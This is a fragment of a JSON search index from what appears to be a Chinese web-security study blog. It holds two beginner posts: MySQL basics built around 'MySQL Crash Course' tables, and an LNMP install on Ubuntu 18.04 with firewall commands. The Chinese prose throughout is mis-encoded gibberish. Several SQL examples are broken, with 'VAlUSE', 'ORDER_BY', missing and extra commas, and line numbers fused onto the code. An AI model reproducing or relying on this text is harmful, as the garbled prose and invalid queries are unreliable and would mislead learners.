´","permalink":"http://ca0y1h.top/tags/hash%E7%88%86%E7%A0%B4/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹MySQLåŸºæœ¬æ“ä½œ","date":"2019-08-11T12:24:26.000Z","path":"Web_security/basic_learning/2.MySQLåŸºæœ¬æ“ä½œ/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹MySQLåŸºæœ¬æ“ä½œ ä¸»è¦ä»¥ã€ŠMySQLå¿…çŸ¥å¿…ä¼šã€‹ï¼ˆã€ŠMySQl Crash Courseã€‹ï¼‰ä¸ºå‚è€ƒ ä»»åŠ¡ç›®æ ‡ ä»€ä¹ˆæ˜¯å…³ç³»å‹å’Œâ¾®å…³ç³»å‹æ•°æ®åº“ é€‰æ‹©â¼€ç§å…³ç³»å‹æ•°æ®åº“è¿›â¾å­¦ä¹  å­¦ä¹ æ•°æ®åº“ä¸­çš„å­—æ®µç±»å‹å¹¶åˆ›å»ºåº“å’Œâ½¤â¼¾è¡¨ï¼Œéœ€è¦åŒ…å«æ‰€æœ‰å­—æ®µç±»å‹ å­¦ä¹ æ•°æ®åº“çš„å¢åˆ æ”¹æŸ¥ï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹ 0x01 SQL&amp;NoSQL å…³ç³»å‹æ•°æ®åº“ å…³ç³»å‹æ•°æ®åº“æ˜¯ä»¥å…³ç³»æ¨¡å‹æ¥åˆ›å»ºçš„æ•°æ®åº“ã€‚ å…³ç³»æ¨¡å‹å°±æ˜¯æŒ‡äºŒç»´è¡¨æ ¼æ¨¡å‹ã€‚ ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“å°±æ˜¯ç”±äºŒç»´è¡¨åŠå…¶ä¹‹é—´çš„è”ç³»ç»„æˆçš„ä¸€ä¸ªæ•°æ®ç»„ç»‡ã€‚ å¸¸è§çš„å…³ç³»å‹æ•°æ®åº“æœ‰ï¼š Mysqlã€Oracleã€PostgreSQLã€SQLServerã€MicrosoftAccess éå…³ç³»å‹æ•°æ®åº“ éå…³ç³»å‹æ•°æ®åº“æ˜¯ä»¥éå…³ç³»æ¨¡å‹æ¥åˆ›å»ºçš„æ•°æ®åº“ã€‚ éå…³ç³»æ¨¡å‹æœ‰åˆ—æ¨¡å‹ã€é”®å€¼å¯¹æ¨¡å‹ã€æ–‡æ¡£ç±»æ¨¡å‹ã€‚ å¸¸è§çš„å…³ç³»å‹æ•°æ®åº“æœ‰ï¼š MongoDBã€Redisã€MemcacheDBã€HBase 0x02 æ•°æ®ç±»å‹ åç§° ç±»å‹ è¯´æ˜ INT æ•´å‹ 4å­—èŠ‚æ•´æ•°ç±»å‹ï¼ŒèŒƒå›´çº¦+/-21äº¿ BIGINT é•¿æ•´å‹ 8å­—èŠ‚æ•´æ•°ç±»å‹ï¼ŒèŒƒå›´çº¦+/-922äº¿äº¿ REAL æµ®ç‚¹å‹ 4å­—èŠ‚æµ®ç‚¹æ•°ï¼ŒèŒƒå›´çº¦+/-1038 DOUBLE æµ®ç‚¹å‹ 8å­—èŠ‚æµ®ç‚¹æ•°ï¼ŒèŒƒå›´çº¦+/-10308 DECIMAL(M,N) é«˜ç²¾åº¦å°æ•° ç”±ç”¨æˆ·æŒ‡å®šç²¾åº¦çš„å°æ•°ï¼Œä¾‹å¦‚ï¼ŒDECIMAL(20,10)è¡¨ç¤ºä¸€å…±20ä½ï¼Œå…¶ä¸­å°æ•°10ä½ï¼Œé€šå¸¸ç”¨äºè´¢åŠ¡è®¡ç®— CHAR(N) å®šé•¿å­—ç¬¦ä¸² å­˜å‚¨æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼ŒCHAR(100)æ€»æ˜¯å­˜å‚¨100ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² VARCHAR(N) å˜é•¿å­—ç¬¦ä¸² å­˜å‚¨å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼ŒVARCHAR(100)å¯ä»¥å­˜å‚¨0~100ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸² BOOLEAN å¸ƒå°”ç±»å‹ å­˜å‚¨Trueæˆ–è€…False DATE æ—¥æœŸç±»å‹ å­˜å‚¨æ—¥æœŸï¼Œä¾‹å¦‚ï¼Œ2018-06-22 TIME æ—¶é—´ç±»å‹ å­˜å‚¨æ—¶é—´ï¼Œä¾‹å¦‚ï¼Œ12:20:59 DATETIME æ—¥æœŸå’Œæ—¶é—´ç±»å‹ å­˜å‚¨æ—¥æœŸ+æ—¶é—´ï¼Œä¾‹å¦‚ï¼Œ2018-06-22 12:20:59 0x03 æ ·ä¾‹è¡¨è®¾è®¡ vendorsè¡¨ vendorsè¡¨å­˜å‚¨é”€å”®äº§å“çš„ä¾›åº”å•†ã€‚æ¯ä¸ªä¾›åº”å•†åœ¨è¿™ä¸ªè¡¨ä¸­æœ‰ä¸€ä¸ªè®°å½•ï¼Œä¾›åº”å•†IDï¼ˆvend_idï¼‰åˆ—ç”¨æ¥åŒ¹é…äº§å“å’Œä¾›åº”å•†ã€‚ åˆ— è¯´æ˜ vend_id ä¾›åº”å•†ID vend_name ä¾›åº”å•†å vend_address ä¾›åº”å•†çš„åœ°å€ vend_city ä¾›åº”å•†çš„åŸå¸‚ vend_state ä¾›åº”å•†çš„å· vend_zip ä¾›åº”å•†çš„é‚®æ”¿ç¼–ç  vend_country ä¾›åº”å•†çš„å›½å®¶ productsè¡¨ productsè¡¨åŒ…å«äº§å“ç›®å½•ï¼Œæ¯è¡Œä¸€ä¸ªäº§å“ã€‚æ¯ä¸ªäº§å“æœ‰å”¯ä¸€çš„IDï¼ˆprod_idåˆ—ï¼‰ï¼Œé€šè¿‡vend_idï¼ˆä¾›åº”å•†çš„å”¯ä¸€IDï¼‰å…³è”åˆ°å®ƒçš„ä¾›åº”å•†ã€‚ åˆ— è¯´æ˜ prod_id äº§å“ID vend_id äº§å“ä¾›åº”å•†ID prod_name äº§å“å prod_price äº§å“ä»·æ ¼ prod_desc äº§å“æè¿° customersè¡¨ customersè¡¨å­˜å‚¨æ‰€æœ‰é¡¾å®¢çš„ä¿¡æ¯ã€‚æ¯ä¸ªé¡¾å®¢æœ‰å”¯ä¸€çš„IDï¼ˆcust_idåˆ—ï¼‰ã€‚ åˆ— è¯´æ˜ cust_id é¡¾å®¢ID cust_name é¡¾å®¢å§“å cust_address é¡¾å®¢çš„åœ°å€ cust_city é¡¾å®¢çš„åŸå¸‚ cust_state é¡¾å®¢çš„å· cust_zip é¡¾å®¢çš„é‚®æ”¿ç¼–ç  cust_country é¡¾å®¢çš„å›½å®¶ cust_contact é¡¾å®¢çš„è”ç³»æ–¹å¼ cust_email é¡¾å®¢çš„é‚®ç®± ordersè¡¨ ordersè¡¨å­˜å‚¨é¡¾å®¢è®¢å•ï¼ˆä½†ä¸æ˜¯è®¢å•ç»†èŠ‚ï¼‰ã€‚æ¯ä¸ªè®¢å•å”¯ä¸€åœ°ç¼–å·ï¼ˆorder_numåˆ—ï¼‰ã€‚è®¢å•ç”¨cust_idåˆ—ï¼ˆå®ƒå…³è”åˆ°customerè¡¨çš„é¡¾å®¢å”¯ä¸€IDï¼‰ä¸ç›¸åº”çš„é¡¾å®¢å…³è”ã€‚ åˆ— è¯´æ˜ order_num å”¯ä¸€è®¢å•å· order_date è®¢å•æ—¥æœŸ cust_id è®¢å•é¡¾å®¢ID orderitemsè¡¨ orderitemsè¡¨å­˜å‚¨æ¯ä¸ªè®¢å•ä¸­çš„å®é™…ç‰©å“ï¼Œæ¯ä¸ªè®¢å•çš„æ¯ä¸ªç‰©å“å ä¸€è¡Œã€‚å¯¹ordersä¸­çš„æ¯ä¸€è¡Œï¼Œorderitemsä¸­æœ‰ä¸€è¡Œæˆ–å¤šè¡Œã€‚æ¯ä¸ªè®¢å•ç‰©å“ç”±è®¢å•å·åŠ è®¢å•ç‰©å“ï¼ˆç¬¬ä¸€ä¸ªç‰©å“ã€ç¬¬äºŒä¸ªç‰©å“ç­‰ï¼‰å”¯ä¸€æ ‡è¯†ã€‚è®¢å•ç‰©å“é€šè¿‡order_numåˆ—ï¼ˆå…³è”åˆ°ordersä¸­è®¢å•çš„å”¯ä¸€IDï¼‰ä¸å®ƒä»¬ç›¸åº”çš„è®¢å•ç›¸å…³è”ã€‚æ­¤å¤–ï¼Œæ¯ä¸ªè®¢å•é¡¹åŒ…å«è®¢å•ç‰©å“çš„äº§å“IDï¼ˆå®ƒå…³è”ç‰©å“åˆ°productsè¡¨ï¼‰ åˆ— è¯´æ˜ order_num è®¢å•å·ï¼ˆå…³è”åˆ°ordersè¡¨çš„order_numï¼‰ order_item è®¢å•ç‰©å“å·ï¼ˆåœ¨æŸä¸ªè®¢å•ä¸­çš„é¡ºåºï¼‰ prod_id äº§å“IDï¼ˆå…³è”åˆ°productsè¡¨çš„prod_idï¼‰ quantity ç‰©å“æ•°é‡ item_price ç‰©å“ä»·æ ¼ productnotesè¡¨ productnotesè¡¨å­˜å‚¨ä¸ç‰¹å®šäº§å“æœ‰å…³çš„æ³¨é‡Šã€‚å¹¶éæ‰€æœ‰äº§å“éƒ½æœ‰ç›¸å…³çš„æ³¨é‡Šï¼Œè€Œæœ‰çš„äº§å“å¯èƒ½æœ‰è®¸å¤šç›¸å…³çš„æ³¨é‡Šã€‚ åˆ— è¯´æ˜ note_id æ³¨é‡ŠID prod_id äº§å“ID note_date å¢åŠ æ³¨é‡Šçš„æ—¥æœŸ note_text æ³¨é‡Šçš„å†…å®¹ 0x04 æ ·ä¾‹è¡¨åˆ›å»º é™„ä»¶ä¸­åŒ…å«ä¸¤ä¸ªå¯ä»¥æ‰§è¡Œçš„SQLè„šæœ¬æ–‡ä»¶ã€‚ create.sqlåŒ…å«åˆ›å»º6ä¸ªæ•°æ®åº“è¡¨ï¼ˆåŒ…æ‹¬æ‰€æœ‰ä¸»é”®å’Œå¤–é”®çº¦æŸï¼‰çš„MySQLè¯­å¥ã€‚ populate.sqlåŒ…å«ç”¨æ¥å¡«å……è¿™äº›è¡¨çš„INSERTè¯­å¥ã€‚ ç„¶åæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤åˆ›å»ºæ ·ä¾‹è¡¨ åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“ é€‰æ‹©æ–°æ•°æ®æºï¼ˆå¦‚æœä½¿ç”¨mysqlå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œç”¨USEå‘½ä»¤ï¼‰ æ‰§è¡Œcreate.sqlè„šæœ¬å’Œpopulate.sqlè„šæœ¬ã€‚å¦‚æœä½¿ç”¨mysqlå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œå¯ç»™å‡º source create.sql;ï¼ˆæŒ‡å®šcreate.sqlæ–‡ä»¶çš„å®Œå…¨è·¯å¾„ï¼‰ 0x05 ç®€å•æ£€ç´¢æ•°æ® å•ä¸ªåˆ—ï¼šSELECT prod_name FROM products; å¤šä¸ªåˆ—ï¼šSELECT pro_id, prod_name, prod_price FROM products; æ‰€æœ‰åˆ—ï¼šSELECT * FROM products; ä¸åŒå€¼çš„è¡Œï¼šSELECT DISTINCT vend_id FROM products; æŒ‡å®šæŸä¸€åŒºé—´çš„è¡Œï¼šSELECT prod_name FROM products LIMIT 5 OFFSET 5; 0x06 æ’åºæ£€ç´¢æ•°æ® æŒ‰å•åˆ—æ’åºæ•°æ®ï¼šSELECT prod_name FROM products ORDER_BY prod_name; æŒ‰å¤šåˆ—æ’åºæ•°æ®ï¼šSELECT prod_id, prod_price, prod_name FROM products ORDER BY prod_price DESC, prod_name; æŒ‡å®šprod_priceé™åºæ’åˆ—ï¼Œprod_nameå‡åºæ’åˆ—ã€‚ æ±‚æœ€å¤§å€¼æˆ–æœ€å°å€¼ï¼šSELECT prod_price FROM products ORDER BY prod_price DESC limit 1; 0x07 è¿‡æ»¤æ•°æ® ï¼ˆORDER BYå­å¥ä½äºWHEREå­å¥åé¢ï¼‰ æ“ä½œç¬¦ç±»å‹ï¼š=, &lt;&gt;, &lt;, &lt;=, &gt;, &gt;=, BETWEEN, IS NULL, AND, OR å…¶ä¸­ANDæ“ä½œç¬¦çš„ä¼˜å…ˆçº§å¤§äºORæ“ä½œç¬¦ï¼Œä¾‹å¦‚ï¼šSELECT prod_name, prod_price FROM products WHERE vend_id = 1002 OR vend_id = 1003 AND prod_price &gt;= 10; å…¶ç»“æœä¸ºï¼š INæ“ä½œç¬¦ï¼šSELECT prod_name, prod_price FROM products WHERE vend_id IN (1002, 1003); INæ“ä½œç¬¦ä¸ORæ“ä½œç¬¦çš„ä½œç”¨ç›¸å½“ï¼Œä½†æ˜¯INæ“ä½œç¬¦æœ‰ä»¥ä¸‹å‡ ç‚¹ä¼˜åŠ¿ï¼š INæ“ä½œç¬¦çš„è¯­æ³•æ›´ç›´è§‚ç®€æ´ï¼› INæ“ä½œç¬¦ä¸€èˆ¬æ¯”ORæ“ä½œç¬¦æ‰§è¡Œæ›´å¿«ï¼› INæ“ä½œç¬¦æœ€å¤§ä¼˜ç‚¹æ˜¯å¯ä»¥åŒ…å«å…¶ä»–SELECTè¯­å¥ï¼Œä½¿å¾—èƒ½å¤Ÿæ›´åŠ¨æ€çš„åˆ›å»ºWHEREå­å¥ã€‚ 0x08 é€šé…ç¬¦ ç™¾åˆ†å·ï¼ˆ%ï¼‰é€šé…ç¬¦ï¼šSELECT prod_id, prod_name FROM products WHERE prod_name LIKE '%anvil%'; æ³¨æ„ï¼š%é€šé…ç¬¦æ— æ³•åŒ¹é…NULLï¼›%é€šé…ç¬¦è¿˜èƒ½åŒ¹é…0ä¸ªå­—ç¬¦ã€‚ ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰é€šé…ç¬¦ï¼šç”¨é€”è·Ÿ%é€šé…ç¬¦ä¸€æ ·ï¼Œä½†æ˜¯_é€šé…ç¬¦åªèƒ½åŒ¹é…å•ä¸ªå­—ç¬¦ã€‚ 0x09 åˆ›å»ºè®¡ç®—å­—æ®µ æ‹¼æ¥å­—æ®µï¼ˆConcat()å‡½æ•°ï¼‰ï¼šSELECT Concat(vend_name, '(' , vend_country, ')') FROM vendors ORDER BY vend_name; Trim()å‡½æ•°ï¼šåˆ é™¤æ•°æ®ä¸¤ä¾§å¤šä½™çš„ç©ºæ ¼æ¥æ•´ç†æ•°æ® SELECT Concat(RTrim(vend_name), '(', RTrim(vend_country), ')' ) FROM vendors ORDER BY vend_name; ä½¿ç”¨åˆ«åï¼šSELECT Concat(vend_name, '(' , vend_country, ')') AS vendor_title FROM vendors ORDER BY vend_name; ç®—æœ¯è®¡ç®—ï¼šSELECT prod_id, quantity, item_price, quantity*item_price AS expanded_price FROM orderitems WHERE order_num = 20005; 0x0A æ±‡æ€»æ•°æ® äº”ç§èšé›†å‡½æ•°ï¼š AVG():è¿”å›æŸåˆ—çš„å¹³å‡å€¼ SELECT AVG(prod_price) AS avg_price FROM products WHERE vend_id = 1003; COUNT():è¿”å›æŸåˆ—çš„è¡Œæ•° ç”¨æ³•1ï¼šCOUNT(*)å¯¹è¡¨ä¸­è¡Œçš„æ•°ç›®è¿›è¡Œè®¡æ•°ï¼Œä¸ç®¡è¡¨åˆ—ä¸­åŒ…å«çš„æ˜¯ç©ºå€¼ï¼ˆNULLï¼‰è¿˜æ˜¯éç©ºå€¼ï¼› SELECT COUNT(*) AS num_cust FROM customers; ç”¨æ³•2ï¼šCOUNT(column)å¯¹ç‰¹å®šåˆ—ä¸­å…·æœ‰å€¼çš„è¡Œè¿›è¡Œè®¡æ•°ï¼Œå¿½ç•¥NULLå€¼ã€‚ `SELECT COUNT(cust_email) AS num_cust FROM customers; MAX():è¿”å›æŒ‡å®šåˆ—ä¸­çš„æœ€å¤§å€¼ï¼ˆå¿½ç•¥å€¼ä¸ºNULLçš„è¡Œï¼‰ SELECT MAX(prod_price) AS max_price FROM products; MIN():è¿”å›æŒ‡å®šåˆ—ä¸­çš„æœ€å°å€¼ï¼ˆå¿½ç•¥å€¼ä¸ºNULLçš„è¡Œï¼‰ SELECT MIN(prod_price) AS mIin_price FROM products; SUM():è¿”å›æŒ‡å®šåˆ—å€¼çš„å’Œ SELECT SUM(quantity*item_price) AS total_price FROM orderitems WHERE order_num = 20005; èšé›†ä¸åŒå€¼ ä»¥ä¸Šçš„äº”ä¸ªèšé›†å‡½æ•°éƒ½å¯ä»¥å¦‚ä¸‹ä½¿ç”¨ï¼š å¯¹æ‰€æœ‰è¡Œæ‰§è¡Œè®¡ç®—æŒ‡å®šALLå‚æ•°æˆ–ä¸ç»™å‚æ•°ï¼ˆALLæ˜¯é»˜è®¤è¡Œä¸ºï¼‰ åªåŒ…å«ä¸åŒçš„å€¼ï¼ŒæŒ‡å®šDISTINCTå‚æ•° SELECT AVG(DISTINCT prod_price) AS avg_price FROM products WHERE vend_id = 1003; ç»„åˆèšé›†å‡½æ•° 12345SELECT COUNT(*) AS num_itemsMIN(prod_price) AS price_min,MAX(prod_price) AS price_max,AVG(prod_price) AS price_avg,FROM products; 0x0B åˆ†ç»„æ•°æ® åˆ›å»ºåˆ†ç»„ SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id; GROUP BYå­å¥æŒ‡ç¤ºMySQLæŒ‰vend_idæ’åºå¹¶ä¸”åˆ†ç»„æ•°æ®ï¼Œè¿™å¯¼è‡´å¯¹æ¯ä¸ªvend_idè€Œä¸æ˜¯æ•´å¼ è¡¨è®¡ç®—num_prodsä¸€æ¬¡ã€‚ æ³¨æ„äº‹é¡¹ï¼š GROUP BY å­å¥ä¸­åˆ—å‡ºçš„æ¯ä¸ªåˆ—éƒ½å¿…é¡»æ˜¯æ£€ç´¢åˆ—æˆ–æœ‰æ•ˆçš„è¡¨è¾¾å¼ (ä½†ä¸èƒ½æ˜¯èšé›†å‡½æ•°)ã€‚å¦‚æœåœ¨ SELECT ä¸­ä½¿ç”¨è¡¨è¾¾å¼,åˆ™å¿…é¡»åœ¨ GROUP BY å­å¥ä¸­æŒ‡å®šç›¸åŒçš„è¡¨è¾¾å¼ï¼Œä¸èƒ½ä½¿ç”¨åˆ«åã€‚ é™¤èšé›†è®¡ç®—è¯­å¥å¤–, SELECT è¯­å¥ä¸­çš„æ¯ä¸ªåˆ—éƒ½å¿…é¡»åœ¨ GROUP BY å­ å¥ä¸­ç»™å‡ºç»™å‡ºç›¸åº”çš„åˆ—åã€‚ å¦‚æœåˆ†ç»„åˆ—ä¸­å…·æœ‰ NULL å€¼,åˆ™ NULL å°†ä½œä¸ºä¸€ä¸ªåˆ†ç»„è¿”å›ã€‚å¦‚æœåˆ— ä¸­æœ‰å¤šè¡Œ NULL å€¼,å®ƒä»¬å°†åˆ†ä¸ºä¸€ç»„ã€‚ GROUP BY å­å¥å¿…é¡»å‡ºç°åœ¨ WHERE å­å¥ä¹‹å, ORDER BY å­å¥ä¹‹å‰ã€‚ è¿‡æ»¤åˆ†ç»„ SELECT cust_id, COUNT(*) AS orders FROM orders GROUP BY cust_id HAVING COUNT(*) &gt;= 2; HAVING éå¸¸ç±»ä¼¼äº WHERE ã€‚äº‹å®ä¸Š,ç›®å‰ä¸ºæ­¢æ‰€å­¦è¿‡çš„æ‰€æœ‰ç±»å‹çš„ WHERE å­å¥éƒ½å¯ä»¥ç”¨ HAVING æ¥æ›¿ä»£ã€‚å”¯ä¸€çš„å·®åˆ«æ˜¯WHERE è¿‡æ»¤è¡Œ,è€Œ HAVING è¿‡æ»¤åˆ†ç»„ã€‚ WHERE å’Œ HAVINGçš„å·®åˆ«ï¼šWHEREåœ¨æ•°æ®åˆ†ç»„å‰è¿›è¡Œè¿‡æ»¤ï¼ŒHAVINGåœ¨æ•°æ®åˆ†ç»„åè¿›è¡Œè¿‡æ»¤ã€‚SELECT vend_id, COUNT(*) AS num_prods FROM products WHERE prod_price &gt;= 10 GROUP BY vend_id HAVING COUNT(*) &gt;=2; WHERE å­å¥è¿‡æ»¤æ‰€æœ‰ prod_price è‡³å°‘ä¸º 10 çš„è¡Œã€‚ç„¶åæŒ‰ vend_id åˆ†ç»„æ•°æ®, HAVING å­å¥è¿‡æ»¤è®¡æ•°ä¸º 2 æˆ– 2 ä»¥ä¸Šçš„åˆ†ç»„ã€‚å¦‚æœæ²¡æœ‰ WHERE å­å¥,å°†ä¼šå¤šæ£€ç´¢å‡ºä¸¤è¡Œ(ä¾›åº”å•† 1002 ,é”€å”®çš„æ‰€æœ‰äº§å“ä»·æ ¼éƒ½åœ¨ 10 ä»¥ä¸‹;ä¾›åº”å•† 1001 ,é”€å”®3ä¸ªäº§å“,ä½†åªæœ‰ä¸€ä¸ªäº§å“çš„ä»·æ ¼å¤§äºç­‰äº 10 )ã€‚ SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id HAVING COUNT(*) &gt;=2; SELECTå­å¥é¡ºåº SELECT----------FROM----------WHERE----------GROUP BY----------HAVING----------ORDER BY----------LIMIT 0x0C æ’å…¥æ•°æ® 123456789101112131415INSERT INTO customers(cust_name, cust_address, cust_city, cust_zip, cust_country, cust_contact, cust_email) VAlUSE(&#x27;Pep E. LaPew&#x27;, &#x27;100 Main Street&#x27;, &#x27;Los Angeles&#x27;, &#x27;CA&#x27;, &#x27;90046&#x27;, &#x27;USA&#x27;, NULL, NULL); åœ¨æ’å…¥è¡Œæ—¶ï¼ŒMySQLå°†ç”¨VALUESåˆ—è¡¨ä¸­çš„ç›¸åº”å€¼å¡«å…¥åˆ—è¡¨ä¸­çš„å¯¹åº”é¡¹ã€‚VALUESä¸­çš„ç¬¬ä¸€ä¸ªå€¼å¯¹åº”äºç¬¬ä¸€ä¸ªæŒ‡å®šçš„åˆ—åã€‚ç¬¬äºŒä¸ªå€¼å¯¹åº”äºç¬¬äºŒä¸ªåˆ—åï¼Œå¦‚æ­¤ç­‰ç­‰ã€‚ å› ä¸ºæä¾›äº†åˆ—åï¼ŒVALUESå¿…é¡»ä»¥å…¶æŒ‡å®šçš„æ¬¡åºåŒ¹é…æŒ‡å®šçš„åˆ—åï¼Œä¸ä¸€å®šæŒ‰å„ä¸ªåˆ—å‡ºç°åœ¨å®é™…è¡¨ä¸­çš„æ¬¡åºã€‚ 0x0D æ›´æ–°å’Œåˆ é™¤æ•°æ® æ›´æ–°æ•°æ® åŸºæœ¬çš„UPDATEè¯­å¥ç”±3éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š è¦æ›´æ–°çš„è¡¨ï¼› åˆ—åå’Œå®ƒä»¬çš„æ–°å€¼ï¼› ç¡®å®šè¦æ›´æ–°è¡Œçš„è¿‡æ»¤æ¡ä»¶ã€‚ ä¾‹å¦‚ï¼š 123UPDATE customersSET cust_email = &#x27;elmer@fudd.com&#x27;WHERE cust_id = 10005; ä¸ºäº†åˆ é™¤æŸä¸ªåˆ—çš„å€¼ï¼Œå¯è®¾ç½®å®ƒä¸ºNULLï¼ˆå‡å¦‚è¡¨å®šä¹‰å…è®¸NULLå€¼ï¼‰ã€‚ 123UPDATE customersSET cust_email = NULLWHERE cust_id = 10005; åˆ é™¤æ•°æ® ä¸‹é¢çš„è¯­å¥ä»customersè¡¨ä¸­åˆ é™¤ä¸€è¡Œï¼š 12DELETE FROM customersWHERE cust_id &#x3D; 10006;","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹Ubuntu18.04å®‰è£…LNMP","date":"2019-08-03T14:13:37.000Z","path":"Web_security/basic_learning/1.åœ¨Ubuntu18.04å®‰è£…LNMP/","text":"æœ¬å‘¨ç›®æ ‡ ä»»åŠ¡ç›®æ ‡ï¼šå‡†å¤‡å­¦ä¹ ç¯å¢ƒï¼Œæ­å»ºWebæœåŠ¡å™¨ï¼Œå¹¶åšç›¸åº”çš„æœåŠ¡å™¨åŠ å›ºå­¦ä¹  æ¨èç¯å¢ƒï¼šlinux+nginx+php-fpm+mysql é¢„æœŸç»“æœï¼šèƒ½å¤Ÿè¿è¡Œ php ä»£ç å¹¶ä¸”å¯ä»¥ä½¿ç”¨ php è¿æ¥ mysqlï¼ŒæˆåŠŸæ‰§è¡Œ mysql çš„è¯­å¥ æ‹“å±•å®éªŒï¼šå¯ä»¥æ­å»ºåŸºäº Apache çš„ç¯å¢ƒã€åŸºäº Windows Server çš„ IIS ç¯å¢ƒç­‰ åŸºæœ¬ç¯å¢ƒ VMware Workstation Player 15 Ubuntu 18.04.2 LTS ç¯å¢ƒæ­å»º å®‰è£…Nginx Install Nginx 12sudo apt updatesudo apt install nginx ä½¿ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š 1sudo service nginx status å¦‚æœNginxå¯åŠ¨æˆåŠŸï¼Œä¼šæœ‰å¦‚ä¸‹æ˜¾ç¤ºï¼š 123456789â— nginx.service - A high performance web server and a reverse proxy server Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: en Active: active (running) since Sat 2019-07-27 13:12:44 CST; 39s ago Docs: man:nginx(8) Main PID: 5836 (nginx) Tasks: 2 (limit: 3433) CGroup: /system.slice/nginx.service â”œâ”€5836 nginx: master process /usr/sbin/nginx -g daemon on; master_pro â””â”€5837 nginx: worker process Configure Firewall ubuntuå®˜æ–¹æ–‡æ¡£æœ‰å¯¹ufwè¿›è¡Œç®€å•çš„ä»‹ç» é…ç½®ufwå…è®¸sshã€httpã€httpsè¿æ¥ï¼š 123sudo ufw allow sshsudo ufw allow httpsudo ufw allow https å¯åŠ¨ufwï¼š 1sudo ufw enable ä½¿ç”¨ä¸‹é¢å‘½ä»¤æ£€æŸ¥é˜²ç«å¢™çŠ¶æ€ï¼š 123456789101112sudo ufw statusStatus: activeTo Action From-- ------ ----22/tcp ALLOW Anywhere 80/tcp ALLOW Anywhere 443/tcp ALLOW Anywhere 22/tcp (v6) ALLOW Anywhere (v6) 80/tcp (v6) ALLOW Anywhere (v6) 443/tcp (v6) ALLOW Anywhere (v6) åœ¨è¿™é‡Œï¼Œå¯ä»¥çœ‹åˆ°ç«¯å£22ï¼ˆSSHï¼‰ï¼Œ80ï¼ˆhttpsï¼‰å’Œ443ï¼ˆhttpsï¼‰å¯¹IPv4å’ŒIPv6éƒ½æ˜¯å¼€æ”¾çš„ã€‚ centos7 firewalldæ“ä½œï¼š æ·»åŠ  firewall-cmd --zone=public --add-port=80/tcp --permanent ï¼ˆâ€“permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆï¼‰ é‡æ–°è½½å…¥ firewall-cmd --reload æŸ¥çœ‹ firewall-cmd --zone=public --query-port=80/tcp åˆ é™¤ firewall-cmd --zone=public --remove-port=80/tcp --permanent æŸ¥çœ‹æ‰€æœ‰å¼€æ”¾çš„ç«¯å£ firewall-cmd --zone=public --list-ports Test Nginx ä½¿ç”¨ifconfigæŸ¥çœ‹æœ¬æœºIPåœ°å€192.168.11.131 åœ¨æµè§ˆå™¨ä¸­è®¿é—®æœ¬æœºIPåœ°å€http://192.168.11.131/ï¼š å®‰è£…MySQL Install MySQL è¾“å…¥ä»¥ä¸‹å‘½ä»¤å®‰è£…MySQLï¼š 1sudo apt install mysql-server å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼æµ‹è¯•MySQLæœåŠ¡å™¨ï¼š 123456789101112131415161718192021222324sudo mysqlWelcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec) Configure MySQL Security é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQLæœåŠ¡å™¨åªæœ‰ä¸€ä¸ªç”¨æˆ·ï¼šrootã€‚å¦‚æœæ‚¨æ˜¯Linuxç³»ç»Ÿä¸Šçš„rootç”¨æˆ·å¹¶æ‰§è¡Œmysqlå‘½ä»¤ï¼Œåˆ™åªèƒ½ä½¿ç”¨æ­¤ç”¨æˆ·ç™»å½•æ•°æ®åº“ï¼Œæ— éœ€è¾“å…¥å¯†ç ï¼Œä¹Ÿä¸éœ€è¦è¾“å…¥å¯†ç ã€‚ 